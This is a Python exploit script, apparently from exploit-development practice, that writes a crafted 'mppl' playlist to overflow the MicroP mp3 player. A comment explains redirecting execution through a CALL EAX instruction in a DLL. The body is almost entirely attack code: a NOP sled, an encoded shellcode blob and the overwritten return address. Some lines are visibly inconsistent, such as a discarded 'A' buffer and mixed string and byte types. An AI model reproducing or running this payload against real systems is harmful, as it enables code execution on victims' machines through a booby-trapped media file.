#!/usr/bin/python
#We are exploiting a microp mp3 player application
# The software reads playlist from 'mppl' extensions.


'''
Apart from the bad characters what makes this case unique, is that instead of the overflow filling up the stack eax
We cannot overwrite past the return address.
The shellcode is present in memory, but eax is pointing to it, not the stack
So our shellcode is not present on the stack, but at address pointed by EAX.
Solution?
Instead of JMP ESP, we can look for JMP EAX and CALL EAX instructions in the dll files.

Immdbg: View--> Executable modules.
and search their within dlls.
'''

f1= open("exploit-microp.mppl","wb")
buf="A"*1276

buf="\x90"*50

buf += b"\xda\xc2\xd9\x74\x24\xf4\xb8\x0c\x7b\x96\xc3\x5a\x31"
buf += b"\xc9\xb1\x4e\x31\x42\x18\x03\x42\x18\x83\xea\xf0\x99"
buf += b"\x63\x3f\xe0\xdc\x8c\xc0\xf0\x80\x05\x25\xc1\x80\x72"
buf += b"\x2d\x71\x31\xf0\x63\x7d\xba\x54\x90\xf6\xce\x70\x97"
buf += b"\xbf\x65\xa7\x96\x40\xd5\x9b\xb9\xc2\x24\xc8\x19\xfb"
buf += b"\xe6\x1d\x5b\x3c\x1a\xef\x09\x95\x50\x42\xbe\x92\x2d"
buf += b"\x5f\x35\xe8\xa0\xe7\xaa\xb8\xc3\xc6\x7c\xb3\x9d\xc8"
buf += b"\x7f\x10\x96\x40\x98\x75\x93\x1b\x13\x4d\x6f\x9a\xf5"
buf += b"\x9c\x90\x31\x38\x11\x63\x4b\x7c\x95\x9c\x3e\x74\xe6"
buf += b"\x21\x39\x43\x95\xfd\xcc\x50\x3d\x75\x76\xbd\xbc\x5a"
buf += b"\xe1\x36\xb2\x17\x65\x10\xd6\xa6\xaa\x2a\xe2\x23\x4d"
buf += b"\xfd\x63\x77\x6a\xd9\x28\x23\x13\x78\x94\x82\x2c\x9a"
buf += b"\x77\x7a\x89\xd0\x95\x6f\xa0\xba\xf1\x5c\x89\x44\x01"
buf += b"\xcb\x9a\x37\x33\x54\x31\xd0\x7f\x1d\x9f\x27\x80\x34"
buf += b"\x67\xb7\x7f\xb7\x98\x91\xbb\xe3\xc8\x89\x6a\x8c\x82"
buf += b"\x49\x93\x59\x3e\x41\x32\x32\x5d\xa8\xae\xb3\xcb\x51"
buf += b"\x46\x5e\x04\x89\x76\x61\xce\xa2\x1e\x9c\xf1\xd6\xd4"
buf += b"\x29\x17\x8c\xf8\x7f\x8f\x39\x3a\xa4\x18\xdd\x45\x8e"
buf += b"\xe2\xe1\xcc\x69\xba\x89\x99\x63\x7c\xb5\x1a\xa6\x2a"
buf += b"\x21\x90\xa5\xee\x50\xa7\xe3\x46\x04\x3f\x79\x07\x67"
buf += b"\xde\x7e\x02\x1d\x20\xeb\xa9\xb4\x77\x83\xb3\xe1\xbf"
buf += b"\x0c\x4b\xc4\xbc\x4b\xb3\x99\xef\x20\x82\x0f\xaf\x5e"
buf += b"\xeb\xdf\x2f\x9f\xbd\xb5\x2f\xf7\x19\xee\x7c\xe2\x65"
buf += b"\x3b\x11\xbf\xf3\xc4\x43\x13\x53\xad\x69\x4a\x93\x72"
buf += b"\x92\xb9\xa7\x75\x6c\x3c\xaf\x84\xaf\xe9\x69\xf3\xc6"
buf += b"\x29\xce\x0c\xad\x0c\x67\x87\xcd\x03\x77\x82"

buf += "\x90"*(1276-len(buf))

# Fill this place with address of instruction of call eax
# 7E41E91A   FFD0             CALL EAX


buf+="\x1a\xe9\x41\x7e"
f1.write(buf)
